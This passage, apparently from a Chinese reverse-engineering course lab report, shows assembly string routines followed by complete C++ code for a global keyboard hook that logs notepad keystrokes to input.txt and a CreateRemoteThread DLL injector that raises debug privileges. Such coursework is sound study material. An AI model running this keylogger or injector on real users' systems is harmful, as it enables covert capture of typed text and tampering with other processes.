&quot;Reverse Engineering&quot;, 0    ;szText==szText2</span><br><span class=\"line\">szText3     db  &quot;Reverse Eng&quot;, 0            ;szText&gt;szText3</span><br><span class=\"line\">szText4     db  &quot;Reverse Engj&quot;, 0           ;szText&lt;szText4</span><br><span class=\"line\">szText5     db  &quot;Reverse Engh&quot;, 0           ;szText&gt;szText5</span><br><span class=\"line\"></span><br><span class=\"line\">.code</span><br><span class=\"line\"></span><br><span class=\"line\">main PROC</span><br><span class=\"line\">;重复将四次比较结果输出</span><br><span class=\"line\">    LEA ESI, szText</span><br><span class=\"line\">    LEA EDI, szText2    ;result=0</span><br><span class=\"line\">    call compare</span><br><span class=\"line\">    LEA ESI, szText</span><br><span class=\"line\">    LEA EDI, szText3    ;result=1</span><br><span class=\"line\">    call compare</span><br><span class=\"line\">    LEA ESI, szText</span><br><span class=\"line\">    LEA EDI, szText4    ;result=-1</span><br><span class=\"line\">    call compare</span><br><span class=\"line\">    LEA ESI, szText</span><br><span class=\"line\">    LEA EDI, szText5    ;result=1</span><br><span class=\"line\">    call compare</span><br><span class=\"line\">    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><br><span class=\"line\">    ;strcmp逻辑</span><br><span class=\"line\"></span><br><span class=\"line\">    INVOKE crt_getchar</span><br><span class=\"line\">    INVOKE ExitProcess, 0</span><br><span class=\"line\"></span><br><span class=\"line\">COMPARE:</span><br><span class=\"line\">    LODSB               ;将ds:esi的第一个字节装入寄存器AL，同时[esi]+1</span><br><span class=\"line\">    SCASB               ;将es:edi的第一个字节和AL相减，同时[edi]+1</span><br><span class=\"line\">                        ;cmpsb 将edi 和 esi的字节相减</span><br><span class=\"line\">    JNE NOTEQ           ;不相等，转到NOTEQ处理</span><br><span class=\"line\">             </span><br><span class=\"line\">    TEST AL, AL         ;看看AL是否为NULL</span><br><span class=\"line\">    JNE COMPARE         ;不为空，则比较下一个</span><br><span class=\"line\">    XOR EAX, EAX        ;为空,将寄存器EAX清空为0</span><br><span class=\"line\">    JMP ENDCMP          ;跳转到返回结果的地方</span><br><span class=\"line\"></span><br><span class=\"line\">NOTEQ:                  ;不相等</span><br><span class=\"line\">    MOV EAX, -1         ;不相等时的处理,将EAX置-1</span><br><span class=\"line\">    JL ENDCMP           ;如果是大于的话,跳到返回结果的地方</span><br><span class=\"line\">    NEG EAX             ;将EAX取反,变为1</span><br><span class=\"line\">             </span><br><span class=\"line\">ENDCMP:       </span><br><span class=\"line\">    MOV EDI, EAX        ;结果存入result</span><br><span class=\"line\">    INVOKE crt_printf, addr format, EDI</span><br><span class=\"line\">    RET</span><br><span class=\"line\">    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><br><span class=\"line\">main ENDP</span><br><span class=\"line\"></span><br><span class=\"line\">END main</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image004.png\" alt=\"img\"></p>\n<h3 id=\"strlen\"><a href=\"#strlen\" class=\"headerlink\" title=\"strlen\"></a>strlen</h3><p>实验思路：依次比较字符串每个字符是否为空（空位字符串结束标志），在二进制表示下，计算ECX的值，最后将结果放入EDI中。</p>\n<p>代码及注释：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">; strlen.asm</span><br><span class=\"line\"></span><br><span class=\"line\">.386</span><br><span class=\"line\">.model flat, stdcall</span><br><span class=\"line\"></span><br><span class=\"line\">include kernel32.inc</span><br><span class=\"line\">includelib kernel32.lib</span><br><span class=\"line\"></span><br><span class=\"line\">include msvcrt.inc</span><br><span class=\"line\">includelib msvcrt.lib</span><br><span class=\"line\"></span><br><span class=\"line\">.data</span><br><span class=\"line\">szText  db  &quot;Reverse Engineering&quot;, 0</span><br><span class=\"line\">format  db  &quot;length = %d&quot;, 0AH, 0</span><br><span class=\"line\"></span><br><span class=\"line\">.code</span><br><span class=\"line\"></span><br><span class=\"line\">main PROC</span><br><span class=\"line\">    LEA EDI, szText             ;将字符串偏移地址送给EDI</span><br><span class=\"line\">    MOV ECX,0FFFFFFFFH          ;ECX置为-1</span><br><span class=\"line\">    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><br><span class=\"line\">    ;strlen逻辑</span><br><span class=\"line\">    XOR EAX, EAX                ;EAX清零</span><br><span class=\"line\">    REPNE SCASB                 ;执行SCASB逻辑，ECX=-1-(字符串长度+1)</span><br><span class=\"line\">    ADD ECX, 2                  ;ECX=-(字符串长度)</span><br><span class=\"line\">    NEG ECX                     ;ECX=字符串长度</span><br><span class=\"line\">    MOV EDI, ECX                ;将结果送到EDI</span><br><span class=\"line\">    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><br><span class=\"line\">    INVOKE crt_printf, addr format, EDI;输出结果</span><br><span class=\"line\"></span><br><span class=\"line\">    INVOKE crt_getchar</span><br><span class=\"line\">    INVOKE ExitProcess, 0</span><br><span class=\"line\">main ENDP</span><br><span class=\"line\"></span><br><span class=\"line\">END main</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image006.png\" alt=\"img\"></p>\n<h3 id=\"strset\"><a href=\"#strset\" class=\"headerlink\" title=\"strset\"></a>strset</h3><p>实验思路：先用strlen将字符串长度读取并存入ECX中，再用STOSB将chr所存放的字符逐位替换原字符串中的字符。</p>\n<p>关键代码及注释：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">; strset.asm</span><br><span class=\"line\"></span><br><span class=\"line\">.386</span><br><span class=\"line\">.model flat, stdcall</span><br><span class=\"line\"></span><br><span class=\"line\">include kernel32.inc</span><br><span class=\"line\">includelib kernel32.lib</span><br><span class=\"line\"></span><br><span class=\"line\">include msvcrt.inc</span><br><span class=\"line\">includelib msvcrt.lib</span><br><span class=\"line\"></span><br><span class=\"line\">.data</span><br><span class=\"line\">szText  db  &quot;Reverse Engineering&quot;, 0</span><br><span class=\"line\">chr     db  &apos;j&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">.code</span><br><span class=\"line\"></span><br><span class=\"line\">main PROC</span><br><span class=\"line\">    LEA EDI, szText             ;将字符串偏移地址送给EDI</span><br><span class=\"line\">    MOV ECX,0FFFFFFFFH          ;ECX置为-1</span><br><span class=\"line\">    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><br><span class=\"line\">    ;strlen逻辑</span><br><span class=\"line\">    XOR EAX, EAX                ;EAX清零</span><br><span class=\"line\">    REPNE SCASB                 ;执行SCASB逻辑，ECX=-1-(字符串长度+1)</span><br><span class=\"line\">    ADD ECX, 2                  ;ECX=-(字符串长度)</span><br><span class=\"line\">    NEG ECX                     ;ECX=字符串长度</span><br><span class=\"line\">    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><br><span class=\"line\"></span><br><span class=\"line\">    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><br><span class=\"line\">    ;strset逻辑</span><br><span class=\"line\">    ;STOS:将AL/AX/EAX的值写入EDI指向的内存</span><br><span class=\"line\">    MOV AL, chr                 ;将要写入的字符串送到AL</span><br><span class=\"line\">    LEA EDI, szText             ;重新将字符串偏移地址送给EDI</span><br><span class=\"line\">    REP STOSB                   ;执行STOSB逻辑</span><br><span class=\"line\">    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><br><span class=\"line\">    INVOKE crt_printf, addr szText;输出结果</span><br><span class=\"line\"></span><br><span class=\"line\">    INVOKE crt_getchar</span><br><span class=\"line\">    INVOKE ExitProcess, 0</span><br><span class=\"line\">main ENDP</span><br><span class=\"line\"></span><br><span class=\"line\">END main</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image008.png\" alt=\"img\"></p>\n<h1 id=\"实验三\"><a href=\"#实验三\" class=\"headerlink\" title=\"实验三\"></a>实验三</h1><h2 id=\"实验内容\"><a href=\"#实验内容\" class=\"headerlink\" title=\"实验内容:\"></a>实验内容:</h2><p>修改第6章的HookDll.cpp，钩取对notepad的输入，使得：</p>\n<ol>\n<li>输入文本仍能正常显示；</li>\n<li>所有输入文本能够记录到input.txt文件中。</li>\n</ol>\n<h2 id=\"实验过程及结果-1\"><a href=\"#实验过程及结果-1\" class=\"headerlink\" title=\"实验过程及结果:\"></a>实验过程及结果:</h2><p>实验思路：原HookDll.cpp的关键回调函数如下，主要更改代码以实现功能的地方用“**”标注：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">LRESULT CALLBACK <span class=\"title\">KeyboardProc</span><span class=\"params\">(<span class=\"keyword\">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span>&#123;</span><br><span class=\"line\">……</span><br><span class=\"line\">        <span class=\"keyword\">if</span>( !_stricmp(p + <span class=\"number\">1</span>, <span class=\"string\">\"notepad.exe\"</span>) )</span><br><span class=\"line\">                 <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">                 <span class=\"comment\">//**主要更改的逻辑在这里**</span></span><br><span class=\"line\">……</span><br><span class=\"line\">    <span class=\"comment\">// 当前进程不是notepad.exe，将消息传递给下一个钩子</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>return 1;</code>的意思是：如果进程是<code>notepad.exe</code>，则不会将消息传递给下一个钩子，而实验要求消息可以正常显示出来，并且将所打印的消息记录到另一个文件夹中，则可以将问题分解为2个：</p>\n<ol>\n<li><p>将键盘输入的消息记录到某处，并且不会在这个时候return 1而是继续将消息传递给下一个钩子。解决方案：此回调函数的wParam参数包含了WPARAM类型的按键的虚键码，将此参数的内容转换成可读的字符类型即可。</p>\n</li>\n<li><p>将保存着wParam内容的参数用文件读写的方式以”a”的方式写入，即可在一个文件夹内保存。解决方案：使用C的fopen函数或者Windows编程中的CreateFile函数</p>\n<blockquote>\n<p>参考来自：<a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx\" target=\"_blank\" rel=\"noopener\">https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx</a></p>\n</blockquote>\n</li>\n</ol>\n<h3 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h3><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"stdio.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"windows.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"tchar.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"ctype.h\"</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">HINSTANCE g_hInstance = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">HHOOK g_hHook = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">HWND g_hWnd = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">BOOL WINAPI <span class=\"title\">DllMain</span><span class=\"params\">(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span> (dwReason)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> DLL_PROCESS_ATTACH:</span><br><span class=\"line\">\t\tg_hInstance = hinstDLL;</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">case</span> DLL_PROCESS_DETACH:</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">LRESULT CALLBACK <span class=\"title\">KeyboardProc</span><span class=\"params\">(<span class=\"keyword\">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> szPath[MAX_PATH] = &#123;</span><br><span class=\"line\">\t\t<span class=\"number\">0</span>,</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> *p = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> ch;  <span class=\"comment\">//ch存放按键的内容</span></span><br><span class=\"line\">\tFILE *fp; <span class=\"comment\">//打开文件流</span></span><br><span class=\"line\">\t<span class=\"comment\">//ToAscii函数参数</span></span><br><span class=\"line\">\tbyte ks[<span class=\"number\">256</span>];</span><br><span class=\"line\">\tGetKeyboardState(ks); <span class=\"comment\">//函数功能:该函数将256个虚拟键的状态拷贝到指定的缓冲区中</span></span><br><span class=\"line\">\tWORD w;</span><br><span class=\"line\">\tUINT scan = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (nCode &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// bit 31 : 0 =&gt; press, 1 =&gt; release</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!(lParam &amp; <span class=\"number\">0x80000000</span>))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tGetModuleFileNameA(<span class=\"literal\">NULL</span>, szPath, MAX_PATH);</span><br><span class=\"line\">\t\t\tp = <span class=\"built_in\">strrchr</span>(szPath, <span class=\"string\">'\\\\'</span>);</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//若加载当前DLL的进程的可执行文件名称为notepad.exe，则消息不会传递给下一个钩子</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!_stricmp(p + <span class=\"number\">1</span>, <span class=\"string\">\"notepad.exe\"</span>))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tToAscii(wParam, scan, ks, &amp;w, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">//函数功能：该函数将指定的虚拟键码和键盘状态翻译为相应的字符或字符串。</span></span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">//该函数使用由给定的键盘布局句柄标识的物理键盘布局和输入语言来翻译代码。</span></span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">//函数原型：int ToAscii(UINT uVirtKey,UINT uScanCode,PBYTE lpKeyState,LPWORD lpChar,UINT uFlags);</span></span><br><span class=\"line\">\t\t\t\tch = (<span class=\"keyword\">char</span>)w;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\tfp = fopen(<span class=\"string\">\"input.txt\"</span>, <span class=\"string\">\"a\"</span>); <span class=\"comment\">//打开流</span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">fprintf</span>(fp, <span class=\"string\">\"%c\"</span>, ch);\t\t  <span class=\"comment\">//写入文件操作</span></span><br><span class=\"line\">\t\t\t\tfclose(fp);\t\t\t\t\t  <span class=\"comment\">//关闭流</span></span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t  <span class=\"comment\">//return 1;</span></span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 当前进程不是notepad.exe，将消息传递给下一个钩子</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> __cplusplus</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"string\">\"C\"</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">\t__declspec(dllexport) <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">HookStart</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\tg_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t__declspec(dllexport) <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">HookStop</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (g_hHook)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tUnhookWindowsHookEx(g_hHook);</span><br><span class=\"line\">\t\t\tg_hHook = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> __cplusplus</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"实验四\"><a href=\"#实验四\" class=\"headerlink\" title=\"实验四\"></a>实验四</h1><h2 id=\"InjectDll-cpp\"><a href=\"#InjectDll-cpp\" class=\"headerlink\" title=\"InjectDll.cpp\"></a>InjectDll.cpp</h2><h3 id=\"tmain\"><a href=\"#tmain\" class=\"headerlink\" title=\"_tmain\"></a>_tmain</h3><ul>\n<li>检查输入参数正确性</li>\n<li>为程序设置权限</li>\n<li>执行注入的操作</li>\n</ul>\n<h3 id=\"InjectDll\"><a href=\"#InjectDll\" class=\"headerlink\" title=\"InjectDll\"></a>InjectDll</h3><ul>\n<li>获得ID对应目标进程句柄<code>[OpenProcess]</code></li>\n<li>将szDllPath路径字符串写入在目标进程地址空间中开辟一块存储空间存放DLL路径名(szDllPath)<code>[VirtualAllocEx/WriteProcessMemory]</code></li>\n<li>获取当前进程地址空间中LoadLibraryW()函数的地址，该函数由kernel32.dll导入<code>[GetModuleHandle/GetProcAddress]</code></li>\n<li>在目标进程中运行线程，该线程执行LoadLibraryW()函数并传入被注入DLL路径作为参数<code>[CreateRemoteThread/WaitForSingleObject]</code></li>\n</ul>\n<h3 id=\"SetPrivilege\"><a href=\"#SetPrivilege\" class=\"headerlink\" title=\"SetPrivilege\"></a>SetPrivilege</h3><ul>\n<li>获取进程的令牌句柄<code>[OpenProcessToken]</code></li>\n<li>函数查看系统权限的特权值，返回信息到一个LUID结构体里<code>[LookupPrivilegeValue]</code></li>\n<li>启用或禁止，指定访问令牌的特权<code>[AdjustTokenPrivileges]</code></li>\n<li>有错误则输出错误信息<code>[GetLastError]</code></li>\n</ul>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"windows.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"tchar.h\"</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">BOOL <span class=\"title\">SetPrivilege</span><span class=\"params\">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> </span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    TOKEN_PRIVILEGES tp;</span><br><span class=\"line\">    HANDLE hToken;</span><br><span class=\"line\">    LUID luid;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//OpenProcessToken-&gt;获取进程的令牌句柄</span></span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">      参数：</span></span><br><span class=\"line\"><span class=\"comment\">        1.当前进程为GetCurrentProcess()</span></span><br><span class=\"line\"><span class=\"comment\">        2.访问令牌特权</span></span><br><span class=\"line\"><span class=\"comment\">        3.AdjustTokenPrivileges的第一个参数</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( !OpenProcessToken(GetCurrentProcess(),</span><br><span class=\"line\">                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, </span><br><span class=\"line\">                          &amp;hToken) )&#123;</span><br><span class=\"line\">        _tprintf(<span class=\"string\">L\"OpenProcessToken error: %u\\n\"</span>, GetLastError());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> FALSE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( !LookupPrivilegeValue(<span class=\"literal\">NULL</span>,           <span class=\"comment\">// lookup privilege on local system</span></span><br><span class=\"line\">                              lpszPrivilege,  <span class=\"comment\">// privilege to lookup </span></span><br><span class=\"line\">                              &amp;luid) )        <span class=\"comment\">// receives LUID of privilege</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        _tprintf(<span class=\"string\">L\"LookupPrivilegeValue error: %u\\n\"</span>, GetLastError() ); </span><br><span class=\"line\">        <span class=\"keyword\">return</span> FALSE; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    tp.PrivilegeCount = <span class=\"number\">1</span>;</span><br><span class=\"line\">    tp.Privileges[<span class=\"number\">0</span>].Luid = luid;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>( bEnablePrivilege )</span><br><span class=\"line\">        tp.Privileges[<span class=\"number\">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        tp.Privileges[<span class=\"number\">0</span>].Attributes = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Enable the privilege or disable all privileges.</span></span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    AdjustTokenPrivilege</span></span><br><span class=\"line\"><span class=\"comment\">    BOOL WINAPI AdjustTokenPrivileges(   </span></span><br><span class=\"line\"><span class=\"comment\">                                __in          HANDLE TokenHandle,   </span></span><br><span class=\"line\"><span class=\"comment\">                                __in          BOOL DisableAllPrivileges,   </span></span><br><span class=\"line\"><span class=\"comment\">                                __in_opt      PTOKEN_PRIVILEGES NewState,   </span></span><br><span class=\"line\"><span class=\"comment\">                                __in          DWORD BufferLength,   </span></span><br><span class=\"line\"><span class=\"comment\">                                __out_opt     PTOKEN_PRIVILEGES PreviousState,   </span></span><br><span class=\"line\"><span class=\"comment\">                                __out_opt     PDWORD ReturnLength   </span></span><br><span class=\"line\"><span class=\"comment\">                                );  </span></span><br><span class=\"line\"><span class=\"comment\">                                1.OpenProcessToken第三个指针参数传出的句柄值</span></span><br><span class=\"line\"><span class=\"comment\">                                2.是否禁用所有所有的特权(这里填false)</span></span><br><span class=\"line\"><span class=\"comment\">                                3.新的TOKEN_PRIVILEGES的特权结构体指针</span></span><br><span class=\"line\"><span class=\"comment\">                                4.是上面结构体的字节长度(sizeof)</span></span><br><span class=\"line\"><span class=\"comment\">                                5.接受原先的特权的结构体</span></span><br><span class=\"line\"><span class=\"comment\">                                6.这个结构体的字节长度的指针</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( !AdjustTokenPrivileges(hToken, </span><br><span class=\"line\">                               FALSE, </span><br><span class=\"line\">                               &amp;tp, </span><br><span class=\"line\">                               <span class=\"keyword\">sizeof</span>(TOKEN_PRIVILEGES), </span><br><span class=\"line\">                               (PTOKEN_PRIVILEGES) <span class=\"literal\">NULL</span>, </span><br><span class=\"line\">                               (PDWORD) <span class=\"literal\">NULL</span>) )</span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">        _tprintf(<span class=\"string\">L\"AdjustTokenPrivileges error: %u\\n\"</span>, GetLastError() ); </span><br><span class=\"line\">        <span class=\"keyword\">return</span> FALSE; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//输出错误信息</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( GetLastError() == ERROR_NOT_ALL_ASSIGNED )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        _tprintf(<span class=\"string\">L\"The token does not have the specified privilege. \\n\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> FALSE;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">BOOL <span class=\"title\">InjectDll</span><span class=\"params\">(DWORD dwPID, LPCTSTR szDllPath)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HANDLE hProcess = <span class=\"literal\">NULL</span>, hThread = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    HMODULE hMod = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    LPVOID pRemoteBuf = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    DWORD dwBufSize = (DWORD)(lstrlen(szDllPath) + <span class=\"number\">1</span>) * <span class=\"keyword\">sizeof</span>(TCHAR);</span><br><span class=\"line\">    LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 获得dwPID进程ID对应的目标进程句柄</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> FALSE;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 在目标进程地址空间中为DLL路径名szDllPath开辟一块存储空间，将szDllPath路径字符串写入该空间</span></span><br><span class=\"line\">    pRemoteBuf = VirtualAllocEx(hProcess, <span class=\"literal\">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\">    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 获取当前进程地址空间中LoadLibraryW()函数的地址，该函数由kernel32.dll导入</span></span><br><span class=\"line\">    hMod = GetModuleHandle(<span class=\"string\">L\"kernel32.dll\"</span>);</span><br><span class=\"line\">    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class=\"string\">\"LoadLibraryW\"</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// 在目标进程中运行线程，该线程执行LoadLibraryW()函数并传入被注入DLL路径作为参数</span></span><br><span class=\"line\">    hThread = CreateRemoteThread(hProcess, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, pThreadProc, pRemoteBuf, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    WaitForSingleObject(hThread, INFINITE); </span><br><span class=\"line\"></span><br><span class=\"line\">    CloseHandle(hThread);</span><br><span class=\"line\">    CloseHandle(hProcess);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> _tmain(<span class=\"keyword\">int</span> argc, TCHAR *argv[])</span><br><span class=\"line\">&#123;<span class=\"comment\">//程序入口</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//如果参数数量不对则退出并提示</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( argc != <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">        _tprintf(<span class=\"string\">L\"USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\\n\"</span>, argv[<span class=\"number\">0</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//为程序提升权限</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( !SetPrivilege(SE_DEBUG_NAME, TRUE) )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// inject dll</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( InjectDll((DWORD)_tstol(argv[<span class=\"number\">1</span>]), argv[<span class=\"number\">2</span>]) )</span><br><span class=\"line\">        _tprintf(<span class=\"string\">L\"InjectDll(\\\"%s\\\") success.\\n\"</span>, argv[<span class=\"number\">2</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        _tprintf(<span class=\"string\">L\"InjectDll(\\\"%s\\\") failed.\\n\"</span>, argv[<span class=\"number\">2</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"MyDll-cpp\"><a href=\"#MyDll-cpp\" class=\"headerlink\" title=\"MyDll.cpp\"></a>MyDll.cpp</h2><h3 id=\"DllMain\"><a href=\"#DllMain\" 